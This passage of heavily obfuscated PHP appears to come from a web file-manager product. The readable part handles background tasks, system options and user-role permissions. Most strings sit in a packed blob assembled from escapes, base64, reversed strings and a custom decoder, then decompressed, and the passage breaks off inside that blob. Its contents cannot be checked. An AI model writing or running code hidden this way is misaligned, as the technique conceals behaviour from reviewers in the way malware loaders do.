$E…É­°³¬ = self::listData(); foreach ($E…É­°³¬ as $F‡äƒ»¹®) { self::kill($F‡äƒ»¹®[$D©×¬¼½Š‘[367]]); } sleep(2); foreach ($E…É­°³¬ as $F‡äƒ»¹®) { self::valueSet($F‡äƒ»¹®[$D©×¬¼½Š‘[367]], !1); } } private static function changeStatus($d³’¸àŸ‡, $EøÉ«ŠÜÛ) { goto Aõ‘ÂÜ÷; Dµ¾˜‚: return !0; goto fëÎùªŸµ; Aõ‘ÂÜ÷: $EÒáºŠÑâ¦ =& $_SERVER[îÖ]; $A† Àù… = self::valueGet($d³’¸àŸ‡); if (!$A† Àù…) { return !1; } goto CÈíñÉï°›; CÈíñÉï°›: $A† Àù…[$EÒáºŠÑâ¦[688]] = $EøÉ«ŠÜÛ; self::valueSet($d³’¸àŸ‡, $A† Àù…); self::log($EÒáºŠÑâ¦[1450] . $A† Àù…[$EÒáºŠÑâ¦[367]] . $EÒáºŠÑâ¦[1451] . $EøÉ«ŠÜÛ); goto Dµ¾˜‚; fëÎùªŸµ: } public static function valueGet($FŠá±©Ñ¹Æ = false) { $FÉ‘ºö‰¼Ù =& $_SERVER[îÖ]; if ($FŠá±©Ñ¹Æ) { $f„›’¶Ş³ò = Model($FÉ‘ºö‰¼Ù[399])->where(array($FÉ‘ºö‰¼Ù[89] => $FŠá±©Ñ¹Æ, $FÉ‘ºö‰¼Ù[29] => $FÉ‘ºö‰¼Ù[1452]))->find(); return $f„›’¶Ş³ò ? json_decode($f„›’¶Ş³ò[$FÉ‘ºö‰¼Ù[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($fœˆ¯«± = false) { goto EÎ±¸â’; EÎ±¸â’: $F‰ŠŞƒò¬æ =& $_SERVER[îÖ]; $C„ß‡…›¾’ = array($F‰ŠŞƒò¬æ[29] => $F‰ŠŞƒò¬æ[1452]); if ($fœˆ¯«±) { $C„ß‡…›¾’[$F‰ŠŞƒò¬æ[1431]] = $fœˆ¯«±; } goto bƒçù¢óÛ; bƒçù¢óÛ: $bˆå¯ÒÜØœ = Model($F‰ŠŞƒò¬æ[399])->where($C„ß‡…›¾’)->select(); $bˆå¯ÒÜØœ = $bˆå¯ÒÜØœ ? $bˆå¯ÒÜØœ : array(); foreach ($bˆå¯ÒÜØœ as $FæŠ‘”†Í => $bñù‚ÅÌ•) { $bˆå¯ÒÜØœ[$FæŠ‘”†Í] = json_decode($bñù‚ÅÌ•[$F‰ŠŞƒò¬æ[359]], !0); } goto Fæ²çµóÑ; Fæ²çµóÑ: return $bˆå¯ÒÜØœ; goto E ÑÏà“Œ•; E ÑÏà“Œ•: } public static function valueSet($f¡ÎÕï, $d’½È­À–) { goto c×§­‡—æ; CóËç¦ŠİÒ: Model($A»ÌÑÆêôö[399])->add($Eéê¢Ö‹İ¢, array(), !0); goto c˜ï§½ÆÀ; c×§­‡—æ: $A»ÌÑÆêôö =& $_SERVER[îÖ]; if (!$d’½È­À–) { return Model($A»ÌÑÆêôö[399])->where(array($A»ÌÑÆêôö[89] => $f¡ÎÕï, $A»ÌÑÆêôö[29] => $A»ÌÑÆêôö[1452]))->delete(); } $D¨Ä‘Å‰ò‰ = json_encode($d’½È­À–); goto BöÔÌ•ââ; BöÔÌ•ââ: if (!$D¨Ä‘Å‰ò‰) { ob_start(); var_dump($d’½È­À–); $BÒî ëÚÒˆ = ob_get_clean(); self::log($A»ÌÑÆêôö[1453] . json_encode_force($BÒî ëÚÒˆ)); } if (!$f¡ÎÕï || !$d’½È­À–[$A»ÌÑÆêôö[367]]) { return !1; } $Eéê¢Ö‹İ¢ = array($A»ÌÑÆêôö[29] => $A»ÌÑÆêôö[1452], $A»ÌÑÆêôö[1431] => USER_ID, $A»ÌÑÆêôö[89] => $f¡ÎÕï, $A»ÌÑÆêôö[359] => $D¨Ä‘Å‰ò‰); goto CóËç¦ŠİÒ; c˜ï§½ÆÀ: } public static function log($DĞÇË® à›) { write_log($DĞÇË® à›, $_SERVER[îÖ][1454]); } } goto FÅ°Ô‘Ä‰Œ; Cí¦ã˜®Ğñ: $B¬í§ïÆª = $_SERVER[îÖ][547]; if (!$B¬í§ïÆª) { die; } $_SERVER[®Ñèœ¡] = explode($_SERVER[îÖ][548], gzinflate(substr($_SERVER[îÖ][549], 10, -8))); goto f§°¬ë÷µ; AøÈ„‚Á¦: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\x65\155\x5f\x6f\160\164\x69\x6f\156"; protected $jsonField = array("\x6d\145\x6e\165", "\x72\x6f\154\145", "\x72\x6f\154\x65\107\162\157\165\160", "\x72\145\x67\x69\x73\164", "\x65\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($eµ¹¸Õ­Õ‹) { return "\x53\x79\163\x74\x65\x6d\x4f\x70\x74\151\x6f\x6e\x5f{$eµ¹¸Õ­Õ‹}"; } protected function optionDefault($CÍÆéÊôğÃ = '') { $dŸÉ¿–ˆ¶ =& $_SERVER[îÖ]; if ($CÍÆéÊôğÃ == $dŸÉ¿–ˆ¶[33]) { return $GLOBALS[$dŸÉ¿–ˆ¶[6]][$dŸÉ¿–ˆ¶[2477]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\x72\157\154\145\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\141\165\164\150", "\x6c\x61\x62\145\154", "\144\x69\x73\x70\x6c\141\171", "\x73\x79\x73\164\145\x6d", "\x64\145\x73\x63", "\x69\147\x6e\x6f\162\145\x45\x78\164", "\151\147\x6e\157\162\x65\106\151\154\x65\123\151\x7a\145", "\141\x64\155\x69\156\x69\163\164\x72\x61\164\157\x72", "\163\x6f\x72\x74"); public function listData($Fä÷ÓâÜç = false, $F¥±‹³ù¿î = "\163\157\x72\164", $e›§ŠÙÚ± = false) { $BîÍÎå…¶ =& $_SERVER[îÖ]; $cÄªñ›ËÓÇ = parent::listData($Fä÷ÓâÜç, $F¥±‹³ù¿î, $e›§ŠÙÚ±); if (!$Fä÷ÓâÜç) { $Bš‹“·á¢ˆ = $BîÍÎå…¶[2478]; foreach ($cÄªñ›ËÓÇ as $E«¦ñ‡—ŒØ => $B»¬‡÷µáê) { if ($B»¬‡÷µáê[$BîÍÎå…¶[2479]] == 1) { $cÄªñ›ËÓÇ[$E«¦ñ‡—ŒØ][$BîÍÎå…¶[405]] = $Bš‹“·á¢ˆ; } } } return $cÄªñ›ËÓÇ; } public function update($fñ¥„³Áë’, $D©›•²ˆ¦) { goto A‚îËæçÆ; Có¸…®»Œ: if (!$E®‹ôÆ“‡ || $a¯ŠÉ´ã¹ && $a¯ŠÉ´ã¹[$C–Ä†ïàê[367]] != $E®‹ôÆ“‡[$C–Ä†ïàê[367]]) { return !1; } if ($a¯ŠÉ´ã¹[$C–Ä†ïàê[2479]] == 1) { $D©›•²ˆ¦ = array($C–Ä†ïàê[28] => $D©›•²ˆ¦[$C–Ä†ïàê[28]], $C–Ä†ïàê[2117] => $D©›•²ˆ¦[$C–Ä†ïàê[2117]]); } $this->filterAuth($D©›•²ˆ¦[$C–Ä†ïàê[376]]); goto a£º´×°æ; A‚îËæçÆ: $C–Ä†ïàê =& $_SERVER[îÖ]; $E®‹ôÆ“‡ = parent::listData($fñ¥„³Áë’); $a¯ŠÉ´ã¹ = $this->findByName($D©›•²ˆ¦[$C–Ä†ïàê[28]]); goto Có¸…®»Œ; a£º´×°æ: return parent::update($fñ¥„³Áë’, $D©›•²ˆ¦); goto fĞ»…Ï¬Ò•; fĞ»…Ï¬Ò•: } public function remove($c§” ‘…) { $DÆõÂ‚ÍÄŒ = parent::listData($c§” ‘…); if (!$DÆõÂ‚ÍÄŒ || $DÆõÂ‚ÍÄŒ[$_SERVER[îÖ][1074]]) { return !1; } return parent::remove($c§” ‘…); } public function add($F¨è–¾«ÑÒ) { goto E¸Ì¾—¸‹©; eœ·Šù°¿˜: return parent::insert($F¨è–¾«ÑÒ); goto BÔĞàæÅéó; E£ĞªõàÄè: $eŠó÷‹È·º = array($E£Ô‡÷÷´Ê[386] => $d²¶îœôŠ¬, $E£Ô‡÷÷´Ê[2105] => $E£Ô‡÷÷´Ê[33], $E£Ô‡÷÷´Ê[2101] => $E£Ô‡÷÷´Ê[2118], $E£Ô‡÷÷´Ê[2480] => 1, $E£Ô‡÷÷´Ê[2104] => 0, $E£Ô‡÷÷´Ê[2481] => 0, $E£Ô‡÷÷´Ê[2103] => $this->getSort()); $F¨è–¾«ÑÒ = array_merge($eŠó÷‹È·º, $F¨è–¾«ÑÒ); $this->filterAuth($F¨è–¾«ÑÒ[$E£Ô‡÷÷´Ê[376]]); goto eœ·Šù°¿˜; E¸Ì¾—¸‹©: $E£Ô‡÷÷´Ê =& $_SERVER[îÖ]; $d²¶îœôŠ¬ = $F¨è–¾«ÑÒ[$E£Ô‡÷÷´Ê[28]]; if ($this->findByName($d²¶îœôŠ¬)) { return !1; } goto E£ĞªõàÄè; BÔĞàæÅéó: } private function getSort() { $AŠğíŞ˜Ûæ =& $_SERVER[îÖ]; $aÆö˜Ûã“ = parent::listData(); $Dñ“ºí™§ë = array_to_keyvalue($aÆö˜Ûã“, $AŠğíŞ˜Ûæ[33], $AŠğíŞ˜Ûæ[2120]); return empty($Dñ“ºí™§ë) ? 0 : max($Dñ“ºí™§ë) + 1; } private function filterAuth(&$AÏø™ÂÚô) { $bĞÖÁÁë«š =& $_SERVER[îÖ]; $aããõß…Ÿ = array(); $Aª‰ĞÓ£ƒñ = array_filter(explode($bĞÖÁÁë«š[47], $AÏø™ÂÚô)); foreach ($Aª‰ĞÓ£ƒñ as $AÏø™ÂÚô) { $Cõ’ñš˜Ğ = explode($bĞÖÁÁë«š[91], $AÏø™ÂÚô); if ($Cõ’ñš˜Ğ[0] == $bĞÖÁÁë«š[1778] && $Cõ’ñš˜Ğ[1] != $bĞÖÁÁë«š[1030]) { $FÖéôÉ†î = $Cõ’ñš˜Ğ[0] . $bĞÖÁÁë«š[91] . $Cõ’ñš˜Ğ[1] . $bĞÖÁÁë«š[2482]; if (!in_array($FÖéôÉ†î, $Aª‰ĞÓ£ƒñ)) { $aããõß…Ÿ[] = $FÖéôÉ†î; } } $aããõß…Ÿ[] = $AÏø™ÂÚô; } $AÏø™ÂÚô = implode($bĞÖÁÁë«š[47], $aããõß…Ÿ); } public function sort($E˜¥óã÷², $cİĞ¯ÆôÕË) { return parent::update($E˜¥óã÷², $cİĞ¯ÆôÕË); } } goto a†¹ï»™ø; eê‘ˆºŠó»: if (!function_exists('_kodDe')) { function _kodDe($D®£Ì²Šİé) { $D®£Ì²Šİé = base64_decode($D®£Ì²Šİé); $eŒ—ÉÆç°ç = strlen($D®£Ì²Šİé); $D¨ô‹×ÄÂÁ = ''; $F™îœ˜Ìèî = ord($D®£Ì²Šİé[0]) - 30; for ($b¹Û…œ“ªÇ = 1; $b¹Û…œ“ªÇ < $eŒ—ÉÆç°ç; $b¹Û…œ“ªÇ += 2) { if ($b¹Û…œ“ªÇ + 1 < $eŒ—ÉÆç°ç) { $D¨ô‹×ÄÂÁ .= chr(ord($D®£Ì²Šİé[$b¹Û…œ“ªÇ + 1]) + $F™îœ˜Ìèî); $D¨ô‹×ÄÂÁ .= chr(ord($D®£Ì²Šİé[$b¹Û…œ“ªÇ]) + $F™îœ˜Ìèî); } else { $D¨ô‹×ÄÂÁ .= chr(ord($D®£Ì²Šİé[$b¹Û…œ“ªÇ]) + $F™îœ˜Ìèî); } } return $D¨ô‹×ÄÂÁ; } } define("\356\326", "\215\304\312\300\320\235\364\322\322"); $_SERVER[îÖ] = explode("\x7c\x3\x7c\x5\x7c\x4", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\75\7\230\33\305\325\224\100\260\3\44\44\77\20\102\133\316\66\127\254\162\315\355\174\167\266\116\322\371\144\337\235\204\244\363\331\234\16\171\45\255\244\275\223\264\362"."\xee\x4a\x57\x6c\x43\x68\x6\x1b\x1c\x8\xc5\xf4\x50\x12\x87\x1a\x53\x43\x28\x6\x42\xef\x10\x5a\xa8\x1\x2\xd8\xa6\x86\x0\x3f\x21\x85\xf2\x4f\x9f\xd9\x95\x8e\x24\x3f\x1f\x67\xcd\xbc\x79\x33\x3b\xe5\xcd\x9b\x37\x33\xef\xbd\xb9"."\372\334\77\76\275\345\245\265\273\257\335\143\355\167\276\274\360\341\123\160\150\355\156\153\167\135\273\47\16\37\176\332\136\273\240\377\166\317\37\165\157\377\156\115\77\330\164\130\373\337\367\277\270\375\240\236\155"."\77\332\375\204\233\272\127\276\365\303\3\67\5\42\257\34\237\257\313\77\127\236\321\264\166\333\354\226\307\267\236\264\154\347\135\346\353\117\134\164\320\255\367\274\26\377\360\372\143\176\363\235\115\241\25\67\207"."\x47\x1f\x38\x6b\xc9\xdd\xef\xec\x7a\xe6\xe7\x8d\x66\xd3\xfc\xe1\xad\xe7\x7a\xda\x47\xe5\xbf\xc4\x5e\xdc\x7f\xdf\x47\x6f\xbd\x7a\xcd\x4f\x4b\xd3\x2e\x9f\xd8\xab\xef\xe8\x17\x5a\x26\xaf\x9d\xf3\xf7\xd7\xbf\x59\x5e\x3b\xb1\xe5\xca".strrev('SÎ¸ï­q|‹oÇîÃ}%»v“–÷¹íÄzíï¼÷|?3+¿İõ×½àãx?ĞúòímÒ÷féD')."\x6c\x3a\x6b\xcb\x55\xb7\xae\x7a\xbc\xa7\xa5\xcb\x71\x9d\xef\xcb\xd6\x5f\x5c\x9a\xfd\xf8\x3\x79\x56\xeb\x7\xfe\x73\xfa\x9e\xbd\xb8\x23\xf3\xde\x39\x7d\xcf\x2d\x38\xd8\xfd\xc3\x67\x5d\xb2\xd2\x91\xf2\x1f\xb4\xe5\xab\x5f\x5f\x70".strrev('=Î_ä{÷7ÄêyßR¦Ëò4§|?]Às#ºº/‚şş¾«†Æç®ŸQÓtg/„ö»ß7U‰‰Ê')."\x1f\x1a\x5c\x7a\xff\x27\xd7\x75\x1c\xd3\x7d\xad\xf3\xbc\x27\x3d\x9d\x7\x3e\xb5\xe1\xce\x2f\x7e\xff\xd9\x19\xc7\xe\x9d\x7d\xf5\xe1\xf3\xe7\x79\x1e\x5f\xf1\xd3\x15\x1f\xad\xfc\xe9\x69\x8f\xfd\x64\x79\x71\xc6\xb5\x9f\x5d\xfa\xdc"."\41\335\43\323\56\332\167\132\76\225\334\162\323\303\323\216\327\214\370\313\173\134\372\253\173\256\76\140\313\246\67\166\333\145\27\334\321\155\370\107\52\150\246\244\214\253\206\151\140\100\122\53\244\325\14\16\253".base64_decode('Bfzrxj/G6pxqKjgc7w9G45GBUMgfjsZJiWJ6XkuRUFHW5TwpvKjoBviUWFy8qBWVggXCASnZlBOy')."\101\112\362\165\305\175\376\120\157\160\145\74\272\62\344\47\30\211\370\352\222\242\117\340\30\12\106\114\131\67\243\152\136\141\30\143\72\253\127\227\177\111\240\137\212\206\75\375\21\217\67\32\10\366\143\260\67".base64_decode('2NcXiFbCw8He3i6Pd1llSijsWdLnkUD9ckpcLaS1OmkVTlkl1eNAt6rkUjhYkGl1zIkiCUVZCIxB')."\241\224\313\341\110\77\13\221\372\53\151\271\224\43\175\346\23\43\105\135\315\313\264\351\313\224\11\6\305\1\271\144\152\152\41\211\43\376\161\123\227\71\34\324\70\251\53\171\245\100\212\212\370\173\375\336\250"."\4\253\51\165\207\203\175\22\31\212\274\154\230\212\56\15\366\370\303\176\11\126\275\243\26\265\270\126\302\371\6\372\101\207\110\236\336\136\151\252\22\114\45\137\244\305\340\74\125\12\13\206\175\376\260\324\265"."\x52\xe2\xfd\x94\xd4\xf2\x79\xad\xe0\x2\xa5\x80\xf1\x34\x85\xaa\xfa\xc3\x61\x1c\x70\x10\xa\xee\xd\xc0\xa1\x23\x91\x60\x77\x77\xc4\xcf\x62\xa4\x71\x47\xf5\x82\x9a\xb4\x10\x2a\xb5\xc4\x52\xe9\x9c\x19\x2f\xcb\xb9\x12\x25\xd6\x51".strrev('jRÔ¥q›¢šaÄJA!wøƒŒ¬œÈÓdHP­Š%C™±¦„RV!Ô­^f¯È~K[ü')."\x4c\xc3\x45\x64\xca\x11\xc2\x93\xcd\xac\x4f\x57\x1\x1e\x29\x50\x73\x25\xb5\xe2\x44\x9f\x56\x26\x6d\x48\xab\x39\xa5\x97\xcd\xb2\xb4\x96\x4b\x29\x3a\x8f\x17\x41\x76\x31\x85\x34\x46\x9d\x14\x72\xf7\x97\xf2\x22\xa\x8b\x26\xb3\x6a"."\56\245\323\311\371\155\230\115\244\130\305\64\101\63\14\132\323\201\142\116\223\123\21\105\27\152\337\15\212\11\226\114\21\130\102\150\335\232\236\367\1\6\100\172\7\220\275\72\120\45\141\224\22\176\112\350\24".strrev('”Ç2‹”q9©}²6VxÁG¸-BFİíh1ÍO’	®2¸¹rU–ªF,\\\'©şZ¿;ÇCu\\a')."\x32\xee\x2a\x66\x8b\x64\xe\xb3\x69\x1b\xb3\x10\x30\xec\xef\x7e\xcd\xf4\xb\x2c\x36\xa7\x25\xe5\x9c\xd8\x52\x1c\xce\x9a\x66\x31\xa2\x14\x52\xb0\x43\x48\x8b\xb4\xb1\x2\xea\xb0\xa2\xa2\x10\x24\x9f\x43\x4a\x49\x7d\xd2\x4a\xa9\xa7"."\x4d\x6d\xa3\xd4\x5\x68\x25\x3d\xc1\x39\x5e\xd6\xcc\xe7\x58\x88\xb6\x96\xc1\xc\x6\x34\xc7\x9\x4d\xd4\x90\xb8\x32\x6e\x92\x4e\x92\x16\x26\xb3\xb2\xe\x86\xaf\xa3\x64\xa6\x9d\xf3\x9\xe3\x28\x16\x73\x6a\x52\x36\x55\xad\xe0\xd6"._kodDe('MJSAKFBB+1JFSEAwu0D3ivL7rwUmK4ubTHBO2dfYeq9gGTbBqLY9O6nr8Ca6MwaX4T80QiGH5jckJA==')."\x4d\x39\x99\x85\xb3\x9f\x17\xdf\xf1\x2d\xf8\x6a\x21\xa7\x16\x94\xa\x5c\x4f\x32\xa9\x18\x86\x13\x66\xd1\xb5\x9c\xd3\x93\xcb\x69\x63\xce\xa0\xae\x66\x54\x90\xa7\xc1\x56\x4d\xc0\x99\xda\x24\xca\x36\x8b\xaa\xae\x18\x34\x2a\x2d\xe9"."\213\22\144\120\53\305\31\322\345\114\136\156\223\212\245\4\350\31\62\77\253\300\60\66\371\172\233\224\204\121\207\224\57\31\246\123\127\0\373\121\301\102\107\6\57\220\166\366\301\361\124\225\224\63\2\270\64"."\x1\xb7\x34\xb6\x4a\x80\x8c\x24\x9a\x86\xa1\x3d\xd1\x68\x28\x1e\xe8\x6\x8b\x71\xbf\x3f\xde\xe7\x89\x7a\x7b\x48\xb5\x4d\x39\x43\xeb\xdc\xb\x78\x2f\x2b\x92\x2\x57\x38\xc1\x94\x83\x84\xd6\xf\xfa\x88\x3\x43\xda\x98\xa2\x83\xf".base64_decode('d020SaNaKqGNu2gSRI4ALkGRYY8WTWdYLmRg/yQmTIWQo1HOWDu0VylkzCzNGPGHl/vD8UiwOzro').base64_decode('CZNlvAAGYpx+Chadc4aVFOj6pEnzyUXYaxQHThQ4xjQVTh6a1htYAjvG5zQAklPEomX3qnkV1t1k')."\x29\xa8\x27\xc1\x1a\xbf\x84\x54\xc8\x8d\x1a\xd4\x11\xcb\x36\xd4\xc5\x52\xb3\xeb\x9d\xe0\xdf\x86\xfa\xa1\x98\xcf\xd5\x30\xbc\xc8\xad\xf2\x3c\xee\x26\x57\x93\xd4\xdc\x38\x57\xa\x1\xa1\x43\x95\x73\x12\x69\x74\x5\x46\xa3\x14\x5c"."\366\55\35\0\327\44\141\232\333\272\16\3\303\376\243\6\374\221\150\274\317\37\355\11\372\310\27\374\36\22\352\325\360\324\244\55\32\302\77\303\144\4\201\250\220\121\222\132\116\323\345\34\144\100\224\336\24".base64_decode('ygQyaprz9QAQaEjHYs7HIxE1X6QMysyW8gkh6OYlEFoAQ8bYksbWIE0noTY3yTKruZsyW3ekBfzP')."\71\153\112\313\313\124\22\105\23\127\111\341\231\213\101\15\226\224\36\105\346\213\232\251\233\32\204\352\26\224\76\305\314\152\244\237\63\12\255\122\211\325\215\326\62\245\344\24\332\113\131\205\162\151\40\136\225"."\x59\xe7\x15\x75\x25\xad\x12\xba\x5\xf2\x14\x80\x73\x2e\xac\x1a\x61\x90\x9\xca\x37\x34\x3e\x8\xc5\x50\xe\x30\x39\xc3\x96\xd\xce\xf4\x61\x44\x58\x99\xbb\x7\x7a\x7b\xe3\xde\x60\x7f\x14\x88\xa2\x18\x32\x18\xe\x44\xfd\x94\x22"."\74\276\270\307\33\142\113\30\37\46\202\0\247\147\45\173\303\220\162\263\300\367\371\2\301\131\56\135\350\40\113\305\141\300\13\213\132\301\120\234\111\122\132\212\63\137\214\261\320\306\171\53\162\160\1\170\334"."\51\347\47\235\171\305\224\235\254\352\326\365\115\212\212\313\144\200\14\1\147\226\71\260\250\202\375\5\135\130\103\301\10\311\260\10\102\201\64\222\120\164\122\217\320\0\111\312\13\303\277\304\117\200\323\351\332"."\x28\x13\xc9\xc5\x33\x18\xa1\x8c\xae\x4\xf0\x75\x75\x52\xe6\x6d\x5c\x44\xeb\x43\xca\x1e\xcf\xe7\xb8\x80\x15\x57\x2d\xe3\x17\xd7\x12\x23\x80\x8b\x1\xa2\x93\xab\xb5\xda\xc9\xc7\x2a\xda\x13\xe8\x5f\x16\xef\xb\xfa\xfc\xbd\xf1\x40"."\77\340\22\321\112\370\100\310\347\241\203\57\302\273\202\321\36\13\164\0\360\211\345\236\336\200\35\335\277\42\20\211\106\252\46\1\330\200\337\226\2\266\134\241\260\277\73\260\202\105\273\3\376\136\137\44\356"."\365\170\173\70\116\277\247\217\104\342\151\270\351\61\334\126\374\70\140\170\21\266\165\212\227\341\66\220\166\146\334\262\117\211\123\11\74\316\351\4\54\136\12\241\115\322\134\270\371\104\55\41\62\161\122\53\121"."\x6a\x65\x42\x5c\x9e\x32\x88\xbc\x4c\x66\xa8\x4c\x17\xa6\x3a\xfc\x53\x2f\x79\x22\x92\x59\x8c\x33\x56\x90\x98\x60\x41\xd4\xc\x1a\x7\xe2\x1a\xf9\xbe\x44\x98\x6f\x45\xd\xe2\x10\xa7\x4b\x49\x6b\xba\xf2\x6d\x0\x4f\xda\x64\x84\x61"."\213\203\171\303\323\300\10\170\320\56\27\120\2\32\221\70\235\213\6\330\37\170\150\165\322\174\207\31\17\202\255\270\7\356\117\343\203\341\140\377\22\222\141\54\253\320\12\4\110\367\327\121\141\206\154\123\115"."\316\222\200\44\42\163\241\222\166\372\210\106\273\162\55\376\71\22\377\0\341\215\174\134\51\320\136\117\100\306\314\30\7\335\203\200\331\102\231\252\126\142\137\113\150\132\216\316\143\260\36\63\176\301\66\270\43".base64_decode('BiWSccqcZtNViywO0eAyf3+cUhaOCdSIAWDLGAyTDjG1UbqBwYlhf4RyAV1ZXVJpd7ldswkVK2D9')."\41\237\167\37\23\33\233\135\67\344\234\355\32\6\201\372\206\305\70\112\142\61\227\45\72\223\344\57\351\54\67\24\123\352\214\105\365\155\61\167\314\135\267\250\155\310\343\234\224\235\223\215\316\5\316\341\331".base64_decode('MVf9bAIYXtPsaF0HEQDiohnD4KcjtmhWzHnksasWD8WGa9tmHxFzzYiNDTfUL6LfSZZ0sDlLTrCq')."\246\146\327\201\52\1\361\205\241\24\20\113\24\20\150\302\244\132\344\320\65\163\327\121\70\30\103\45\303\163\14\71\143\263\207\27\11\371\4\220\375\133\100\164\1\374\71\313\360\74\316\243\141\313\130\126\70"."\357\11\175\224\12\111\316\135\341\274\110\310\111\302\7\324\114\201\115\41\260\240\263\115\261\125\152\136\63\13\377\256\243\3\231\121\350\262\14\317\263\164\102\235\245\202\272\232\156\365\13\312\152\22\320\114\112".strrev('®£ÇŒ-‰Qr’6ÁiÆ@¥)bÆ5Ø¡Æ(­ w´—o|!!Ë’@Ûnƒˆ%¸'."\0".'y(SÅ	ß').base64_decode('Xn+cchjCiWkcccUudjgGmsY5KuUPSS4yG6tzEmIGkqLrmt6GDv6MUhHKYmDXZIL+lMBWWurolHA3')."\23\56\21\27\73\275\50\123\151\2\356\156\231\204\340\256\213\305\112\103\112\152\170\10\20\262\354\114\17\257\151\131\127\117\245\144\167\14\374\107\43\230\177\221\32\27\371\370\31\100\326\112\232\154\301\255\70"."\237\212\63\16\10\253\300\216\31\64\235\255\263\20\316\245\126\123\63\345\34\103\203\151\121\10\241\334\206\256\325\144\217\216\7\260\227\63\41\270\72\13\247\167\210\103\366\263\243\51\166\342\40\34\34\1\230"."\x43\x88\xe2\x7f\x3b\x6a\x28\x9b\x2e\x80\x89\xe0\xe5\x8b\x54\xc0\xe7\x24\x83\xe8\x59\xe1\xc\x10\x1\x9e\x5\x54\x2a\x6a\xca\x60\x3a\x9b\x14\x6a\x68\x25\x3d\xa9\x30\x1c\x8b\x90\x61\xca\x3a\x58\xb3\xb8\x64\x7\x65\x30\xe1\x78\x11"."\324\334\1\317\41\34\160\115\165\0\151\317\1\317\173\34\134\142\165\360\43\4\7\223\77\35\104\54\165\360\322\111\60\340\163\250\206\17\211\307\250\134\224\104\353\154\146\341\206\74\47\117\70\160\375\173\225"."\xb2\x92\x73\xd0\xda\x3b\x68\xa3\x1c\xb4\x5\xe\xb4\xdf\xf0\x91\xda\xc\x0\xfa\x20\xb5\x41\x41\xc0\x24\xb2\xe\x38\x1c\x70\x6c\x69\x29\x30\x48\xbb\x81\x9\xd5\xe\x2e\x70\x3b\x32\xba\x56\x2a\x86\xe8\x97\x84\x18\xae\xc\x1\xf0".strrev('ÇìDo²\\\\y§å%?°]ƒªàYrİé…^ÜpI>[=¯8œ´<:°@ã@±'."\0".'İLÓX@2š').base64_decode('Q7wTeSWiciYifN6UM/TbVVJxOKwkJ5J8c+MTdkvWGBt6RIfViKn60DMCYbQ2fdo0Stmcjgj5WIht')."\112\352\346\155\12\26\371\212\3\31\102\4\360\101\141\312\123\120\220\163\230\22\131\41\145\43\111\145\231\61\172\117\241\120\230\120\177\332\172\113\271\60\312\147\46\155\242\4\13\160\10\74\33\216\216\223\17"."\xb1\x10\x25\x3f\xaa\x16\xc7\xfd\x1a\xcf\xb3\x9d\x5\xeb\x68\x1b\x33\x82\xfd\x1e\x52\xb\x13\x6a\x41\xdc\xbb\x73\x28\xe7\x79\x9c\x28\x20\x79\xf3\x18\xee\xe3\xa9\xc2\x98\xb7\xf0\xb3\x1\x7\x39\x33\x70\x80\x7d\xe3\xa8\xc0\xf5\xf8"."\36\27\324\36\146\25\352\116\112\262\325\234\116\100\247\65\312\347\343\0\330\46\305\155\244\112\210\64\53\353\274\227\351\34\203\204\315\132\145\100\24\36\25\320\322\162\231\263\173\113\36\141\146\30\346\4\73".base64_decode('5hCC1kJx1DdVpIft/qpFxUmnGr2gN6uFUUujWtUokgokIA/QYzIq3sdtxwwgKoxU3HIigavhYawP')."\10\66\71\60\2\272\13\116\222\45\220\261\211\253\20\137\241\40\63\305\141\1\251\150\347\201\26\136\135\155\341\263\163\153\33\324\26\345\37\265\360\235\212\325\211\10\47\104\26\155\44\124\237\2\273\106\227".base64_decode('jjmbC4gf5K7H0Sgsb3z6rjEmDFPJE064ztY7JtjeJGTdpYMa8YryJYEIHyUGGLZj4OJ7NSoLQ/r3').strrev('Øû„‡'."\n".'–ğå¼h‚U¼K•Ä{_\\ñ«¹8Õ˜,³¹%NAŒUq.¢	ƒ<ØG¡èÓ7 BT§')."\74\273\266\102\100\227\141\152\105\236\42\104\161\262\220\304\13\25\260\130\347\243\32\202\25\40\205\344\3\336\205\10\227\344\105\22\64\46\156\127\16\140\270\104\126\344\321\165\112\44\270\171\360\4\7\0\105"."\20\234\256\21\172\202\130\215\43\343\302\375\145\176\317\212\213\202\37\166\341\5\312\45\247\122\101\172\274\46\206\53\121\305\323\204\352\5\241\253\157\126\224\20\253\216\356\311\345\370\75\232\75\76\145\26\74"."\x57\xc5\x4c\x22\x64\xca\x6c\xdd\x48\x8\xa6\x7\xdc\xd5\x60\x4c\xa6\xeb\xb6\xd1\x10\x9f\x71\xfc\x9e\xd2\x2e\xf2\x5a\x99\xcf\xbf\x13\xc7\x2a\x66\x0\x1f\xd0\xea\x71\xc8\x1f\xb3\x6a\x41\x31\xd8\xca\xa4\x1b\xd5\xf8\xcc\xbf\x93\x6f"."\54\122\257\125\220\21\45\30\262\34\362\346\212\335\12\311\177\52\132\200\151\302\241\22\330\103\1\200\270\216\260\223\23\316\167\204\245\22\55\73\161\323\262\354\207\121\31\302\174\260\14\61\230\177\270\105\335"."\xba\x96\xf\x4\xc1\xfc\xaa\x4e\x74\x76\x3c\x85\x9e\x1d\x21\xa6\x36\xce\xb6\x64\x62\x26\x40\x24\x70\x15\x9a\xaa\x4c\x9a\xcc\x8a\xe2\x4b\xd6\xd6\x67\xde\xbd\xf8\x72\x1c\x3c\xef\xdc\xbb\x5f\x7f\xe7\xdd\x17\x3e\xf9\xd9\x1b\x38\x3e"."\277\211\134\334\203\177\167\5\177\50\314\325\216\116\136\61\241\275\366\320\376\113\176\356\116\74\174\343\145\127\75\263\161\115\366\214\137\273\266\275\342\75\132\335\322\61\53\276\151\303\112\375\266\137\155\176\247".base64_decode('+OifD7vmm6ZXjnzq8Prw83u8f4V/9JbF37vlxt1v6TnzO1/NfeHn2jNH7NznjNI5PzlhwWc7Jj97').base64_decode('/eOvXr/owe89PLPh2E//ePbh7ROz71/0/BzH6z85+CX3AVsOCf+2uae3uSt9eHDdh888sdfoAyc/')."\370\334\5\243\7\176\157\306\376\127\357\161\362\262\366\367\303\211\263\26\224\47\16\137\320\377\306\357\46\136\155\372\352\306\237\217\54\361\176\371\115\41\161\137\375\176\316\75\56\3